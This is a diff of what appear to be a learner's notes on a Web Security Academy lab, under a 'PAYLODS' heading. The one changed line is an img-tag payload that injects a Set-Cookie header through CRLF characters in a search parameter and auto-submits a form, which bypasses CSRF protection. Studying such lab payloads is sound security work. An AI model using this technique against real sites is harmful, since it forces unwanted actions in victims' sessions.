@@ -328,7 +328,7 @@
  
  ## PAYLODS 
  
-       <img src="https://0a46002a0304dbd3c03a186b00050036.web-security-academy.net/?search=asif%0d%0aSet-Cookie:%20csrfKey=mVCTxe6SETdHTB59NX7izfWGmQbCJtGt"onerror="document.forms[0].submit()">
+    <img src="https://0a46002a0304dbd3c03a186b00050036.web-security-academy.net/?search=asif%0d%0aSet-Cookie:%20csrfKey=mVCTxe6SETdHTB59NX7izfWGmQbCJtGt"onerror="document.forms[0].submit()">
 
  
  
